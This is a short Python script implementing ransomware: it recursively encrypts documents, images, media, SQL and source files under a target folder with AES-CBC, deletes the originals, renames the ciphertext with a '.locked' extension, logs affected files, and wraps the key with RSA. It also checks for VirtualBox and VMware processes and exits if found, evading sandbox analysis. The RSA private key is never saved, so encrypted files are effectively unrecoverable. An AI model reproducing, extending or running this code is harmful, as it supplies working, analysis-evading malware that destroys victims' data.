import os, sys, psutil, base64
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa, padding

TARGET_EXTENSIONS = ['.docx', '.pdf', '.xls', '.ppt', '.jpg', '.png', '.mp4', '.sql', '.cpp', '.py']
EXCLUDE_FILES = ['winlogon.exe', '.dll', '.sys']
LOG_FILE = "affected_files.log"

def is_virtual_machine():
    vm_indicators = ['vboxservice.exe', 'vmtoolsd.exe']
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] and proc.info['name'].lower() in vm_indicators:
            return True
    return False

def generate_keys():
    aes_key = os.urandom(32)
    iv = os.urandom(16)

    rsa_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_key = rsa_key.public_key()

    encrypted_key = public_key.encrypt(
        aes_key,
        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
    )
    return aes_key, iv, encrypted_key, rsa_key

def encrypt_file(file_path, key, iv):
    with open(file_path, 'rb') as f:
        data = f.read()
    pad_len = 16 - (len(data) % 16)
    data += bytes([pad_len] * pad_len)

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(data) + encryptor.finalize()

    with open(file_path + '.locked', 'wb') as f:
        f.write(ciphertext)
    os.remove(file_path)

    with open(LOG_FILE, 'a') as log:
        log.write(file_path + '\n')

def walk_and_encrypt(directory, key, iv):
    for root, _, files in os.walk(directory):
        for file in files:
            if any(file.endswith(ext) for ext in TARGET_EXTENSIONS) and not any(ex in file for ex in EXCLUDE_FILES):
                try:
                    encrypt_file(os.path.join(root, file), key, iv)
                except:
                    continue

if __name__ == "__main__":
    if is_virtual_machine():
        print("[!] Virtual environment detected. Exiting.")
        sys.exit(0)

    aes_key, iv, encrypted_key, rsa_priv = generate_keys()
    walk_and_encrypt("C:\\TestEncrypt", aes_key, iv)

    with open("aes_key.enc", "wb") as f:
        f.write(encrypted_key)
    print("[+] Files encrypted. Key saved.")
